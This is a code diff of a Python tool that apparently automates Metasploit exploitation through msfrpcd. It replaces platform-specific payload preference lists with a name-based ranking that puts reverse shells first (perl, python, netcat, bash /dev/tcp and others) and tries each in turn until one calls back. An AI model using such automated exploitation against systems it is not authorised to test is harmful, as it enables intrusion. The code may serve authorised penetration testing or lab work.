@@ -141,11 +141,6 @@ def _service_name_term(service):
 
 _MODULE_TYPES = ("exploit", "auxiliary", "post", "payload", "encoder", "nop", "evasion")
 
-_PLATFORMS = (
-    "windows", "linux", "unix", "osx", "android", "apple_ios", "solaris",
-    "bsd", "aix", "java", "php", "python", "ruby", "nodejs", "multi",
-    "firefox", "mainframe", "netware",
-)
 
 # OS-family taxonomy for the candidate platform filter. A module's declared
 # platform comes from Metasploit metadata (module.info), not from its path, so
@@ -1062,161 +1057,77 @@ def _strip_type(full):
     return full
 
 
-def _platform_from_module(full):
-    parts = full.split("/")
-    if len(parts) >= 2 and parts[1] in _PLATFORMS:
-        seg = parts[1]
-        return None if seg == "multi" else seg
-    return None
+def _transport_rank(name):
+    """Reliability order of a reverse payload's transport/interpreter, lower better.
+    Plain reverse_tcp is the most reliable; the interpreter command shells (perl,
+    python, openssl, ruby) are next and almost always present; netcat and awk need
+    specific binaries; http/https reverse work but are slower; reverse_bash is last
+    because it depends on bash /dev/tcp, absent on many targets."""
+    p = name.lower()
+    if "reverse_bash" in p:
+        return 9
+    if "reverse_tcp" in p:
+        return 0
+    if "reverse_perl" in p:
+        return 1
+    if "reverse_python" in p:
+        return 2
+    if "reverse_openssl" in p:
+        return 3
+    if "reverse_ruby" in p:
+        return 4
+    if "reverse_netcat" in p:
+        return 5
+    if "reverse_awk" in p:
+        return 6
+    if "reverse_https" in p:
+        return 7
+    if "reverse_http" in p:
+        return 8
+    return 6
 
 
-def _platform_from_host(host):
-    text = f"{getattr(host, 'os_match', '')}".lower()
-    if not text:
-        return None
-    if "windows" in text:
-        return "windows"
-    if "linux" in text:
-        return "linux"
-    if "mac os" in text or "osx" in text or "darwin" in text:
-        return "osx"
-    if any(x in text for x in ("unix", "bsd", "solaris", "aix")):
-        return "unix"
-    return None
-
-
-def _is_x64(host):
-    arch = f"{getattr(host, 'arch', '')}".lower()
-    if arch in ("x64", "x86_64", "amd64", "64", "x86-64"):
-        return True
-    text = f"{getattr(host, 'os_match', '')}".lower()
-    return "x64" in text or "64-bit" in text or "x86_64" in text
-
-
-def _payload_prefs(platform, x64):
-    """Preferred reverse payloads for a platform, shell payloads first. The goal is
-    to prove code execution (a shell calling back is proof the host is compromised),
-    not to maintain rich post-exploitation access, so command and native shell
-    payloads are preferred. They also avoid a meterpreter option-serialization issue
-    that some msfrpcd builds reject (AutoLoadExtensions must be a scalar), which
-    blocks meterpreter payloads outright. Meterpreter stays as a last-resort fallback
-    for modules that only offer it."""
-    prefs = []
-    if platform == "windows":
-        if x64:
-            prefs += [
-                "windows/x64/shell/reverse_tcp",
-                "windows/x64/shell_reverse_tcp",
-            ]
-        prefs += [
-            "windows/shell/reverse_tcp",
-            "windows/shell_reverse_tcp",
-        ]
-    elif platform == "linux":
-        if x64:
-            prefs += [
-                "linux/x64/shell/reverse_tcp",
-                "linux/x64/shell_reverse_tcp",
-            ]
-        prefs += [
-            "linux/x86/shell/reverse_tcp",
-            "linux/x86/shell_reverse_tcp",
-        ]
-    elif platform == "osx":
-        prefs += [
-            "osx/x64/shell_reverse_tcp",
-        ]
-    elif platform == "unix":
-        # Order by reliability on old and hardened targets. Interpreter payloads
-        # (perl, python) are almost always present and need no shell networking
-        # features. netcat and telnet (cmd/unix/reverse) follow. reverse_bash is
-        # LAST: it depends on bash /dev/tcp, which many targets (older
-        # Metasploitable-era bash, dash, bash built without net redirections)
-        # do not provide, so it fires but the callback never opens.
-        prefs += [
-            "cmd/unix/reverse_perl",
-            "cmd/unix/reverse_python",
-            "cmd/unix/reverse_netcat",
-            "cmd/unix/reverse_openssl",
-            "cmd/unix/reverse",
-            "cmd/unix/reverse_bash",
-        ]
-    elif platform == "java":
-        # java targets deliver a JVM payload, so the generic and native
-        # command shells below never produce a session here; the working java
-        # payloads must rank ahead of them. Command shell first per the
-        # shell-over-meterpreter preference, with java meterpreter (what msf
-        # itself defaults to for these modules) as the java fallback.
-        prefs += ["java/shell/reverse_tcp", "java/shell_reverse_tcp",
-                  "java/jsp_shell_reverse_tcp",
-                  "java/meterpreter/reverse_tcp"]
-    elif platform == "php":
-        prefs += ["php/reverse_php"]
-    elif platform == "python":
-        prefs += ["python/shell_reverse_tcp"]
-    # generic shell fallbacks come before any platform meterpreter below, so a
-    # module offering only meterpreter plus a generic shell still proves execution
-    # with the shell. Meterpreter platform payloads are appended last as the true
-    # last resort for modules that offer nothing else.
-    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_perl",
-              "cmd/unix/reverse_python", "cmd/unix/reverse_netcat",
-              "cmd/unix/reverse", "cmd/unix/reverse_bash"]
-    if platform == "windows":
-        if x64:
-            prefs += ["windows/x64/meterpreter/reverse_tcp",
-                      "windows/x64/meterpreter_reverse_tcp"]
-        prefs += ["windows/meterpreter/reverse_tcp",
-                  "windows/meterpreter_reverse_tcp"]
-    elif platform == "linux":
-        if x64:
-            prefs += ["linux/x64/meterpreter/reverse_tcp",
-                      "linux/x64/meterpreter_reverse_tcp"]
-        prefs += ["linux/x86/meterpreter/reverse_tcp",
-                  "linux/x86/meterpreter_reverse_tcp"]
-    elif platform in ("java", "php", "python", "osx"):
-        prefs += [f"{platform}/meterpreter/reverse_tcp"]
-    return prefs
+def _payload_sort_key(name):
+    """Generic reliability ranking of one compatible payload, best (lowest) first,
+    derived only from the payload name so it needs no per-platform list and no guess
+    at the module's platform. Order of significance: reverse (calls back to our
+    handler) before bind; command shell before meterpreter (a shell proves execution
+    and sidesteps a meterpreter option-serialization issue some msfrpcd builds
+    reject) before anything that is neither; a platform-native payload before the
+    generic cross-platform one (generic/shell_reverse_tcp is listed compatible for
+    JVM/interpreter targets but never lands there); then the transport order."""
+    p = name.lower()
+    bind_tier = 0 if ("reverse" in p and "bind" not in p) else 1
+    if "meterpreter" in p:
+        kind = 1
+    elif "shell" in p or p.startswith("cmd/"):
+        kind = 0
+    else:
+        kind = 2
+    origin = 1 if p.startswith("generic/") else 0
+    return (bind_tier, kind, origin, _transport_rank(p), name)
 
 
 def _select_payloads(exploit, full_module, host):
-    """Return compatible reverse payloads for this module in reliability order,
-    best first. This is the ordered form of _select_payload used by the fire
-    fallback: if the first payload fires but never calls back, the next is tried.
-    Preference order comes first (platform command shells, then generic, then
-    meterpreter), followed by any remaining reverse payloads, with bind payloads
-    last. Returns [] when the module exposes no payloads."""
+    """Compatible reverse payloads for this module in reliability order, best first.
+    Ranks the module's OWN compatible payload set by generic rules (see
+    _payload_sort_key) rather than guessing the module's platform from its path, so a
+    multi/ module that delivers a JVM payload (java_rmi_server) picks a java payload
+    instead of falling back to the host OS and choosing generic/shell_reverse_tcp.
+    full_module and host are kept for logging only. Returns [] when the module
+    exposes no payloads; the fire fallback tries the list in order."""
     try:
-        compat = set(exploit.payloads or [])
+        compat = list(exploit.payloads or [])
     except Exception as e:
         logger.warning("could not list payloads for %s: %s", full_module, e)
         return []
     if not compat:
         return []
-    platform = _platform_from_module(full_module) or _platform_from_host(host)
-    x64 = _is_x64(host)
-    ordered = []
-    seen = set()
-    for p in _payload_prefs(platform, x64):
-        if p in compat and p not in seen:
-            ordered.append(p)
-            seen.add(p)
-    # remaining reverse (non-bind) payloads the prefs did not name, shells first
-    rest_shell = sorted(p for p in compat if p not in seen
-                        and "reverse" in p and "bind" not in p
-                        and "meterpreter" not in p)
-    rest_rev = sorted(p for p in compat if p not in seen
-                      and "reverse" in p and "bind" not in p)
-    for p in rest_shell + rest_rev:
-        if p not in seen:
-            ordered.append(p)
-            seen.add(p)
-    # bind and anything else last, so a callback-based payload is always tried first
-    if not ordered:
-        tail = sorted(compat)
-        if tail:
-            logger.warning("no reverse payload for %s; falling back to %s",
-                           full_module, tail[0])
-            return tail[:1]
+    ordered = sorted(compat, key=_payload_sort_key)
+    if not any("reverse" in p.lower() and "bind" not in p.lower()
+               for p in ordered):
+        logger.warning("no reverse payload for %s; best-effort %s",
+                       full_module, ordered[0])
     return ordered
 
 
